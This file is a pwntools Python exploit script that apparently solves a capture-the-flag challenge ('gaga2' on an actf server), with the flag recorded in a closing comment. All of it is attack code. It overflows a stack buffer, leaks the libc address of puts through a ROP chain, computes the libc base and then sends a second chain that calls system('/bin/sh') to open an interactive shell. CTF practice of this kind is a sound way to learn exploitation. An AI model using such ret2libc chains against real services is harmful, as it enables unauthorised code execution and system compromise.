#!/usr/bin/env python3

from pwn import *

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

exe = ELF("./gaga2")
libc = exe.libc

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

rop = ROP(exe)

pop_rdi = rop.find_gadget(['pop rdi'])[0]
ret = rop.find_gadget(['ret'])[0]
success(f'{hex(pop_rdi)=}')
success(f'{hex(ret)=}')

main_function = exe.symbols.main
puts_plt = exe.plt.puts
puts_got = exe.got.puts
success(f'{hex(puts_plt)=}')
success(f'{hex(puts_got)=}')


def conn():
	if args.LOCAL:
		r = process([exe.path])
	elif args.REMOTE:
		r = remote("challs.actf.co", 31302)
	else:
		r = gdb.debug([exe.path])
	return r

def main():
	r = conn()

	offset = 64 + 8

	payload = b''.join([
		b'A' * offset,
		p64(pop_rdi),
		p64(puts_got),
		p64(puts_plt),
		p64(main_function),
	])
	r.sendline(payload)

	r.recvuntil(b"Your input: ")
	puts_libc = u64(r.recvline().strip().ljust(8, b'\x00'))
	success(f'{hex(puts_libc)=}')

	libc_base = puts_libc - libc.symbols.puts
	success(f'{hex(libc_base)=}')
	libc.address = libc_base

	system = libc.symbols.system
	bin_sh = next(libc.search(b'/bin/sh\x00'))
	success(f'{hex(system)=}')
	success(f'{hex(bin_sh)=}')

	payload = b''.join([
		b'A' * offset,
		p64(ret),
		p64(pop_rdi),
		p64(bin_sh),
		p64(system),
		#p64(main_function),
	])
	r.recvuntil(b"Your input: ")
	r.sendline(payload)

	r.interactive()


if __name__ == "__main__":
	main()

# actf{b4by's_first_pwn!_3857ffd6bfdf775e}

